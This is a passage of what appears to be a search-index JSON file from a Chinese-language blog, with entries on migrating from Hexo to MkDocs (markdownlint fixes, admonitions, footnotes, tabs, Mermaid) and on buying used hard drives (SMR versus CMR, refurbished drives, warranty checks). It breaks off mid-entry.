\u6807\u51c6\u8bed\u6cd5\u4e2d\uff0cblock \u5143\u7d20\u524d\u540e\u90fd\u9700\u8981\u7a7a\u884c\u3002\u4f46\u662f obsidan \u652f\u6301\u4e0d\u52a0\u7a7a\u884c\uff0c github \u4e5f\u652f\u6301 list \u524d\u9762\u4e0d\u52a0\u7a7a\u884c\u3002</p> <p>\u522b\u4eba\u5173\u4e8e\u662f\u5426\u9700\u8981\u652f\u6301\u8fd9\u4e2a\u5e38\u89c1\u201c\u9519\u8bef\u201d\u7684\u8ba8\u8bba Blank lines before lists, revisited - Spec - CommonMark Discussion</p> <p>\u4fee\u590d\u529e\u6cd5</p> <ul> <li>cd \u5230\u5305\u542b md \u7684\u76ee\u5f55</li> <li>\u8fd0\u884c markdownlint-cli2<ul> <li>\u5176\u4e2d <code>**</code> \u5339\u914d\u4efb\u610f\u7b26\u53f7\uff0c<code>*</code> \u5339\u914d\u9664 <code>/</code> \u5916\u7b26\u53f7\u3002\u56e0\u6b64 <code>**/*.md</code> \u8868\u793a\u5f53\u524d\u76ee\u5f55\u53ca\u5b50\u76ee\u5f55\u4e0b\u6240\u6709 md \u6587\u4ef6\u3002</li> <li><code>#node_modules</code> \u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u540c\u6837\u662f\u7528\u4e8e\u5339\u914d\u6587\u4ef6\u3002\u4e0d\u8fc7 <code>#</code> \u7528\u4e8e\u53d6\u6d88\uff08negate\uff09\u5339\u914d\u3002\u56e0\u6b64\u8be5\u53c2\u6570\u4f5c\u7528\u662f\u6392\u9664 node_modules \u76ee\u5f55\uff0c\u907f\u514d\u7d22\u5f15\u592a\u591a\u6587\u4ef6\u3002</li> <li><code>--fix</code> \u53c2\u6570\u7528\u4e8e\u4fee\u6539\u6e90\u6587\u4ef6</li> </ul> </li> </ul> <pre><code>docker run -v $PWD:/workdir davidanson/markdownlint-cli2:v0.13.0 \"**/*.md\" \"#node_modules\" --fix\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#mkdocs-\u6269\u5c55\u683c\u5f0f","title":"mkdocs \u6269\u5c55\u683c\u5f0f","text":"<p>mkdocs \u5c06 markdown \u8bb8\u591a\u6269\u5c55\u8bed\u6cd5\u90fd\u4f5c\u4e3a\u63d2\u4ef6\u5f00\u542f\uff0c\u6bd4\u5982 footnotes\u3002</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u7bb4\u8a00-admonition","title":"\u7bb4\u8a00 Admonition","text":"<p>Admonitions - Material for MkDocs (squidfunk.github.io)</p> <ul> <li>\u9ed8\u8ba4\u6807\u9898\u4e3a note</li> <li><code>!!! note \"\"</code> \u4e0d\u4f7f\u7528\u6807\u9898</li> </ul> \u7bb4\u8a00Source <p>Phasellus posuere in sem ut cursus</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <pre><code>!!! note \"Phasellus posuere in sem ut cursus\"\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <ul> <li>\u4f7f\u7528 <code>???</code> \u8868\u793a\u53ef\u6298\u53e0\u7684\u5757</li> <li><code>???+</code> \u9ed8\u8ba4\u5c55\u5f00</li> </ul> Collapsible blocksSource Note <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <pre><code>???+ note\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <p>\u5176\u5b83\u7c7b\u578b\u89c1 https://squidfunk.github.io/mkdocs-material/reference/admonitions/#supported-types</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#footnotes","title":"footnotes","text":"<p>Footnotes - Material for MkDocs (squidfunk.github.io)</p> <pre><code>Lorem ipsum[^1] dolor sit amet, consectetur adipiscing elit.[^2]\n\n[^1]: Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n\n[^2]:\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod\n    nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor\n    massa, nec semper lorem quam in massa.\n</code></pre> <p>Lorem ipsum<sup>1</sup> dolor sit amet, consectetur adipiscing elit.<sup>2</sup></p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#highlighting","title":"highlighting","text":"<p>\u5bf9\u6587\u672c\u8fdb\u884c\u591a\u79cd\u7a81\u51fa\uff1a\u9ad8\u4eae\u3001\u4e0b\u5212\u7ebf\u3001\u5220\u9664\u7ebf\u3002</p> <p>Formatting - Material for MkDocs (squidfunk.github.io)</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#highlighting-text","title":"Highlighting text","text":"Highlighting textSource <ul> <li>This was marked (highlight)</li> <li>This was inserted (underline)</li> <li>This was deleted (strikethrough)</li> </ul> <pre><code>- ==This was marked (highlight)==\n- ^^This was inserted (underline)^^\n- ~~This was deleted (strikethrough)~~\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#sub--and-superscripts","title":"Sub- and superscripts","text":"Sub- and superscriptsSource <ul> <li>H<sub>2</sub>O</li> <li>A<sup>T</sup>A</li> </ul> <pre><code>- H~2~O\n- A^T^A\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#content-tabs","title":"Content tabs","text":"<p>\u521b\u5efa Tab \u5207\u6362\u663e\u793a\u7684\u5185\u5bb9\u3002</p> <p>Content tabs - Material for MkDocs (squidfunk.github.io)</p> CC++Source <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n  printf(\"Hello world!\\n\");\n  return 0;\n}\n</code></pre> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n  std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n  return 0;\n}\n</code></pre> <pre><code>=== \"C\"\n\n    ``` c\n    #include &lt;stdio.h&gt;\n\n    int main(void) {\n      printf(\"Hello world!\\n\");\n      return 0;\n    }\n    ```\n\n=== \"C++\"\n\n    ``` c++\n    #include &lt;iostream&gt;\n\n    int main(void) {\n      std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n      return 0;\n    }\n    ```\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#diagrams","title":"diagrams","text":"<p>Diagrams - Material for MkDocs (squidfunk.github.io)</p> <p>Material for MkDocs integrates with\u00a0Mermaid.js, a very popular and flexible solution for drawing diagrams.</p> <p>obsidian \u540c\u6837\u652f\u6301\u663e\u793a\u8be5\u683c\u5f0f\u3002</p> diagramsSource <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];\n</code></pre> <p>\u5176\u5b83\u683c\u5f0f\u53c2\u89c1\uff1aState diagrams | Mermaid</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"<p>math: Math - Material for MkDocs (squidfunk.github.io) task list: Lists - Material for MkDocs (squidfunk.github.io)</p> <ol> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.\u00a0\u21a9\u21a9</p> </li> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.\u00a0\u21a9</p> </li> </ol>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/","title":"\u4e8c\u624b\u673a\u68b0\u786c\u76d8\u8d2d\u4e70","text":"<p>\u81ea\u534a\u5e74\u524d\u8d2d\u5165 6 \u5757\u76d8\uff0c\u7ffb\u8f66\u4e86\u4e00\u5757\u76d8\u540e\uff0c\u8bb0\u5f55\u4e0b\u4e70\u4e8c\u624b\u673a\u68b0\u786c\u76d8\u7684\u7ecf\u9a8c\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>(56 \u5c01\u79c1\u4fe1 / 81 \u6761\u6d88\u606f) \u5982\u4f55\u4e70\u5230\u9760\u8c31\u7684\u4e8c\u624b\u786c\u76d8? - \u77e5\u4e4e (zhihu.com)</li> <li>\u673a\u68b0\u786c\u76d8\u65b0\u76d8\u9a8c\u8d27\u5c0f\u767d\u653b\u7565\uff08\u4fee\u8ba2\uff09 - \u54d4\u54e9\u54d4\u54e9</li> <li>(70 \u5c01\u79c1\u4fe1 / 58 \u6761\u6d88\u606f) \u4f60\u4ece\u522b\u4eba\u7684\u65e7\u786c\u76d8\u91cc\u53d1\u73b0\u4e86\u4ec0\u4e48\u6709\u8da3\u7684\u4e1c\u897f\uff1f - \u77e5\u4e4e</li> <li>\u987a\u4fbf backblaze \u6709\u4e2a\u7ecf\u5178\u7684\u673a\u68b0\u786c\u76d8\u6545\u969c\u7edf\u8ba1\uff0c\u53ef\u80fd\u53ef\u4ee5\u53c2\u8003\uff1ahttps://www.backblaze.com/cloud-storage/resources/hard-drive-test-data</li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u770b\u786c\u76d8\u578b\u53f7\u548c-sn-\u7801","title":"\u770b\u786c\u76d8\u578b\u53f7\u548c SN \u7801","text":"<p>\u901a\u8fc7\u578b\u53f7\u6765\u786e\u8ba4\u786c\u76d8\u4e0d\u540c\u7248\u672c\u3002\u867d\u7136\u90fd\u662f HC520\uff0c\u4e0d\u540c\u7684 OEM \u578b\u53f7\u6709\u4e0d\u540c\u540e\u7f00\u3002\u6bd4\u5982 HUH721212ALE601 \u548c HUH721212ALE600</p> <p>SN \u7801\u552f\u4e00\u6807\u8bc6\u4e00\u5757\u786c\u76d8\uff0c\u7528\u4e8e\u8d28\u4fdd\u3002\u5356\u5bb6\u53d1\u4e4b\u524d\u5fc5\u987b\u53d1\u4e00\u5f20\u5305\u542b SN \u7801\u7684\u56fe\uff0c\u6536\u8d27\u8981\u4e00\u81f4\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5782\u76f4\u76d8\u4e0e\u53e0\u74e6\u76d8","title":"\u5782\u76f4\u76d8\u4e0e\u53e0\u74e6\u76d8","text":"<p>Zoned storage\uff0c\u4e0e\u53e0\u74e6\uff08SMR\uff09\u76d8 Zoned storage\u00a0\u662f\u4e00\u79cd\u65b0\u578b\u7684\u786c\u76d8\u5b58\u50a8\u6280\u672f\uff0c\u5b83\u5c06\u786c\u76d8\u5206\u4e3a\u591a\u4e2a\u533a\u57df\uff0c\u6bcf\u4e2a\u533a\u57df\u7684\u5199\u5165\u65b9\u5f0f\u4e0d\u540c\uff0c \u901a\u8fc7\u66b4\u9732\u66f4\u591a\u7684\u4fe1\u606f\u7ed9 OS \u4f7f\u5f97\u9488\u5bf9\u6027\u7684\u4f18\u5316\u5f97\u4ee5\u8fdb\u884c\uff0c\u4ee5\u63d0\u5347\u786c\u76d8\u7684\u5bb9\u91cf\u548c\u6027\u80fd\u3002 \u6211\u4eec\u5e38\u8bf4\u7684\u300c\u53e0\u74e6\u76d8\u300d\u5c31\u662f\u4e00\u79cd zoned storage\u3002\u53e0\u74e6\u76d8\u901a\u8fc7\u91cd\u53e0\u78c1\u9053\u7684\u65b9\u5f0f\uff08\u7c7b\u4f3c\u4e8e\u5c4b\u9876\u4e0a\u74e6\u7247\u6392\u5217\u4e00\u822c\uff09\u6765\u589e\u52a0\u5b58\u50a8\u5bc6\u5ea6\u3002 \u5176\u5199\u5165\u548c\u56fa\u6001\u786c\u76d8\u7684\u95ea\u5b58\u6709\u4e00\u4e9b\u76f8\u4f3c\uff1a\u9700\u8981\u5148\u8bfb\u53d6\u4e34\u8fd1\u78c1\u9053\u7684\u6570\u636e\uff0c\u7136\u540e\u64e6\u9664\u6574\u4e2a\u533a\u5757\uff0c\u518d\u91cd\u5199\uff0c\u4f1a\u5f88\u5927\u7a0b\u5ea6\u5f71\u54cd\u5199\u5165\u6027\u80fd\u3002 \u56e0\u6b64\u53e0\u74e6\u76d8\u5185\u90e8\u901a\u5e38\u5212\u5206\u4e3a\u591a\u4e2a\u5199\u5165\u533a\u57df\uff0c\u4ee5\u51cf\u5c0f\u5199\u5165\u6027\u80fd\u7684\u5f71\u54cd\u3002\u4f46\u662f\u4f60\u5728\u5e02\u9762\u4e0a\u53ef\u4ee5\u4e70\u5230\u7684\u53e0\u74e6\u76d8\u51e0\u4e4e\u90fd\u6ca1\u6709\u66b4\u9732 zoned storage \u7684\u63a5\u53e3\u7ed9\u64cd\u4f5c\u7cfb\u7edf\uff08\u8fd9\u4e9b\u76d8\u4e5f\u88ab\u79f0\u4e3a Device-Managed SMR\uff09\uff0c \u56e0\u6b64\u5728\u7cfb\u7edf\u5199\u5165\u65f6\u4ecd\u4f1a\u5c06\u5176\u89c6\u4e3a\u666e\u901a\u786c\u76d8\u3002 \u8fd9\u5bfc\u81f4\u4e86\u53e0\u74e6\u76d8\u7684\u6027\u80fd\u8fdc\u4e0d\u53ca\u4f20\u7edf\u7684\u975e\u91cd\u53e0\u78c1\u9053\u7684\u786c\u76d8\u3002\u786c\u76d8\u5382\u5546\u53ef\u80fd\u4e0d\u4f1a\u6807\u6ce8\u76f8\u5173\u4fe1\u606f\uff0c\u56e0\u6b64\u5728\u8d2d\u4e70\u786c\u76d8\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5782\u76f4\u76d8\u4e0e\u53e0\u74e6\u76d8\u68c0\u67e5","title":"\u5782\u76f4\u76d8\u4e0e\u53e0\u74e6\u76d8\u68c0\u67e5","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u901a\u8fc7\u78c1\u5934\u6570\u548c\u7f13\u5b58\u5927\u5c0f\u63a8\u6d4b","title":"\u901a\u8fc7\u78c1\u5934\u6570\u548c\u7f13\u5b58\u5927\u5c0f\u63a8\u6d4b","text":"<p>WD BLUE 4TB SMR or CMR? - WD External Drives / External Drives for PC - WD Community --- WD BLUE 4TB SMR \u8fd8\u662f CMR\uff1f- WD \u5916\u7f6e\u786c\u76d8 / PC \u5916\u7f6e\u786c\u76d8 - WD \u793e\u533a \u6df7\u6dc6\u662f\u57fa\u4e8e\u4e00\u4e9b\u4e92\u8054\u7f51\u5e16\u5b50\uff0c\u5176\u4e2d\u58f0\u79f0\u7b2c\u4e8c\u4e2a APOLLO \u578b\u53f7\u662f SMR\uff0c\u56e0\u4e3a\u5b83\u7684\u78c1\u5934\u66f4\u5c11 \uff086\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u7684\u76d8\u7247\u4e5f\u66f4\u5c11\uff0c\u56e0\u6b64\u5b83\u53ef\u80fd\u4f1a\u4f7f\u7528 SMR\uff08\u5bc6\u5ea6\uff09\uff0c\u4f46\u5b83\u4e5f\u6709 64mb \u7684\u7f13\u5b58\uff0c\u8fd9\u5c06\u4f7f\u5b83\u6210\u4e3a CMR\uff0c\u56e0\u4e3a\u901a\u5e38 SMR HDD \u6709\u66f4\u591a\u7684\u7f13\u5b58\uff0c \u8fd9\u662f WD \u7684 256mb\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5e38\u89c1\u78c1\u76d8\u5217\u8868","title":"\u5e38\u89c1\u78c1\u76d8\u5217\u8868","text":"<p>checklist: 3.5\u5bf8 \u673a\u68b0\u786c\u76d8 SMR/PMR \u81ea\u52a9\u67e5\u8be2_\u673a\u68b0\u786c\u76d8_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com) \u66f4\u8be6\u7ec6\u7684\u5217\u8868\uff1a[\u66f4\u65b0\u5566]\u673a\u68b0\u786c\u76d8\u53e0\u74e6\u76d8(SMR)\u901f\u67e5\u8868 [20220603\u66f4\u65b0\u5404\u54c1\u724c\u5b98\u7f51\u6700\u65b0\u6570\u636e\u8868\u5185\u5bb9\u5305\u62ec\u6700\u8fd1\u70ed\u95e8\u7684\u65b04T\u7d2b\u76d8\u7b49][\u52c9\u5f3a\u8d76\u5f97\u4e0a618] 178</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u4ec0\u4e48\u662f\u6e05\u96f6\u76d8","title":"\u4ec0\u4e48\u662f\u6e05\u96f6\u76d8","text":"<p>\u6e05\u96f6\u76d8\uff1a\u673a\u68b0\u786c\u76d8\u9ed1\u8272\u4ea7\u4e1a\u94fe\u63ed\u79d8\u2014\u2014\u4ec0\u4e48\u662f\u6e05\u96f6\u76d8\u548c\u7ffb\u65b0\u76d8\uff1f\u9760\u8c31\u7684\u673a\u68b0\u786c\u76d8\u90a3\u91cc\u53bb\u4e70\uff1f_\u54d4\u54e9\u54d4\u54e9_bilibili</p> <p>\u4e00\u4e9b\u786c\u76d8\u7684\u56fa\u4ef6\u53ef\u4ee5\u4fee\u6539\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fee\u6539 SMART \u4fe1\u606f - \u6700\u5178\u578b\u7684\u662f\u65e5\u7acb\u7684\u4e00\u4e2a\u578b\u53f7\u3002\u6211\u54b8\u9c7c\u751a\u81f3\u9047\u5230\u4e86\u65e5\u7acb\u7ffb\u65b0\u6210\u5e0c\u6377\u7684\u76d8\uff08\u65e5\u7acb\u88ab\u897f\u6570\u6536\u8d2d\u4e86\uff0c\u5e0c\u6377\u548c\u897f\u6570\u662f\u4e24\u4e2a\u4e0d\u540c\u516c\u53f8\uff09</p> <p>\u4ec0\u4e48\u662f\u7ffb\u65b0\u76d8</p> <ul> <li>\u4ece\u6570\u636e\u4e2d\u5fc3\u9000\u5f79\u4e0b\u6765\uff0c\u5c06\u6570\u636e\u62b9\u9664\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u6ca1\u6709\u95ee\u9898\u7684\u76d8\uff0c\u91cd\u65b0\u5305\u88c5\u552e\u5356</li> </ul> <p>\u54b8\u9c7c\u4e0a 0 \u901a\u7535\u975e\u539f\u5305\u88c5 OEM \u662f\u600e\u4e48\u56de\u4e8b\uff1f - \u4ef7\u683c\u786e\u5b9e\u6bd4\u666e\u901a\u4e8c\u624b\u8d35\uff0c 550 -&gt; 720\uff0c\u65e5\u671f\u662f\u6700\u8fd1 2 \u5e74\u7684\uff08\u4e8c\u624b\u4e00\u822c4-5\u5e74\uff09\uff0c\u597d\u50cf\u53ef\u4fe1\u5ea6\u8fd8\u884c\uff1f</p> <p>\u8fd4\u4fee\u76d8</p> <p>\u897f\u6570\u7684\u8fd4\u4fee\u786c\u76d8\u4f1a\u5728\u76d8\u4f53\u53f3\u4e0a\u89d2\u4fa7\u9762\u7528\u6fc0\u5149\u523b\u4e0a\u8fd4\u4fee\u76d8\u5b57\u6837\uff0c\u52a1\u5fc5\u5173\u6ce8\u662f\u5426\u5b58\u5728\u8be5\u5b57\u6837\uff0c\u52a1\u5fc5\u5173\u6ce8\u76d8\u4f53\u4fa7\u9762\u8be5\u4f4d\u7f6e\u662f\u5426\u5b58\u5728\u70e7\u8680\u3001\u523b\u5212\u75d5\u8ff9\u6216\u8d34\u4e0a\u6807\u7b7e\u8fdb\u884c\u906e\u6321\uff0c\u6709\u76f8\u5f53\u4e00\u90e8\u5206\u65e0\u826f\u5546\u5bb6\u5c06\u8be5\u6807\u8bb0\u6467\u6bc1\u6216\u8986\u76d6\u540e\u5356\u51fa</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u8d28\u4fdd\u67e5\u8be2","title":"\u8d28\u4fdd\u67e5\u8be2","text":"<p>\u5e0c\u6377\uff1a\u8d28\u4fdd\u548c\u66f4\u6362 | Support Seagate US \u897f\u6570\uff1a\u897f\u90e8\u6570\u636e\u4ea7\u54c1\u8d28\u4fdd\u8303\u56f4 (wd.com)</p> <p>OEM \u76d8</p> <p>\u987a\u5e26\u63d0\u4e00\u5634\uff0c\u5982\u679c\u4f60\u4e70\u7684OEM\u76d8\uff0c\u4e0d\u7ba1\u662f\u5e97\u4fdd\u8fd8\u662f\u6d77\u5eb7\u8fd8\u662f\u5176\u4ed6OEM\uff0c\u53bb\u786c\u76d8\u7684\u5b98\u7f51\u90fd\u662f\u63d0\u793a\uff1a\u201c\u8bf7\u8054\u7cfb\u8d2d\u4e70\u7684\u5546\u5bb6\u201d\u3002\u5e0c\u6377\u7684OOS\uff08\u4e0d\u5408\u683c\u54c1\uff09\u4f1a\u63d0\u793a\u201c\u672a\u7ecfSeagate\u4fdd\u8bc1\u201d\uff0c\u90e8\u5206\u6765\u8def\u53ef\u7591\u7684\u76d8\u4f1a\u63d0\u793a\u201cWarranty Information Not Available\u201d\uff0c\u897f\u6570\u4f1a\u63d0\u793a\"No Limited Warranty\"</p> <p>\u552e\u5356 OEM \u578b\u53f7\u7684\u4ee3\u7406\u5546\u53ef\u80fd\u6709\u81ea\u5df1\u7684\u7f51\u7ad9\u53ef\u4ee5\u8d28\u4fdd\u67e5\u8be2</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u7ecf\u9a8c","title":"\u7ecf\u9a8c","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u95ee\u95ee\u4fdd\u4fee","title":"\u95ee\u95ee\u4fdd\u4fee","text":"<p>\u5c31\u7b97\u5e97\u5bb6\u4ecb\u7ecd\u91cc\u6ca1\u6709\u5199\u4fdd\u4fee\uff0c\u4e5f\u95ee\u4e00\u95ee\u3002\u5b9e\u6d4b\u5e97\u5bb6\u4f1a\u7ed9\u4f60\u4fdd\u4fee</p> <p>\u5efa\u8bae\u9009\u62e9\u81f3\u5c11\u63d0\u4f9b 3 \u4e2a\u6708\u4fdd\u4fee\u7684\u5e97\uff0c\u597d\u4e00\u70b9\u7684\u63d0\u4f9b 1 \u5e74\u4fdd\u4fee\u3002ebay \u4e0a\u7ffb\u65b0\u76d8\u63d0\u4f9b 5 \u5e74\u5c31\u5f88\u79bb\u8c31</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5728-ebay-\u4e0a\u770b\u770b","title":"\u5728 Ebay \u4e0a\u770b\u770b","text":"<p>\u4ec0\u4e48\uff0c\u5916\u56fd\u4e70\u786c\u76d8\uff0c\u6bd4\u56fd\u5185\u8fd8\u4fbf\u5b9c\uff1f</p> <ul> <li>\u660e\u786e\u6807\u660e\u4e86\u662f\u7ffb\u65b0\u76d8\uff0c\u786c\u76d8\u6765\u6e90\uff0c\u4f7f\u7528\u65f6\u95f4\uff08\u8bf4\u6570\u636e\u4e2d\u5fc3\u4e2d\u7528\u4e865\u5e74\uff09\uff0c\u5e76\u4e14\u4ed6\u4eec\u8fd8\u63d0\u4f9b 5 \u5e74\u4fdd\u4fee\u3002</li> </ul> <p>NOTE: These HDD is used by Datacenter Servers for about 5 years period.HDD was refurbished and data wiped with DoD Standard.It's fully tested &amp; passed HGST factory diagnose software test with ZERO Bad sectors!Since this is a heavy duty enterprise HDD with 2.5M-hour MTBF rating.We are confidence that to honor another 5 Years Warranty from these hard drives!Buy with confidence &amp; Worry Free!</p> <p>\u53d8\u76f8\u77e5\u9053\u4e86\u77e5\u9053\u54b8\u9c7c\u4e0a\u7684\u8d27\u7684\u6765\u6e90\uff08\u5927\u8239\u9760\u5cb8\uff09</p> <p>HGST Ultrastar DC HC520 12TB SATA 6Gb 256MB 3.5\u201c \u4f01\u4e1a\u7ea7\u786c\u76d8- HUH721212ALE601 |\u6613\u8da3 --- HGST Ultrastar DC HC520 12TB SATA 6Gb 256MB 3.5\" Enterprise HDD- HUH721212ALE601 | eBay</p> <p>comes with documentation as to its power requirements and even a bypass cable to prevent incompatibilities with different power delivery. (this drive doesn't work with 3.3v signal) Installed into an older HP tower. Had to set a longer BIOS timeout to allow drive to spin up as it does take a few extra seconds for this model otherwise it may not detect from a cold start.</p> <p>\u8fd9\u4e00\u6279 ALE601 \u7684\u8d27\u666e\u904d\u5728 28k-34k 